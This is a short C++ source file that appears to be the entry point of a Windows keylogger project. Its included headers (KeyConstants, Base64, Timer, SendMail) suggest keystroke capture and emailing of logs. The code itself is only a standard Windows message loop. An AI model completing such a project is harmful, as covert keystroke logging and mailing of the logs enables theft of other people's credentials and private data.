#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"



using namespace std; //different commit now.

int main()
{
    MSG Msg;

    while(GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return 0;
}
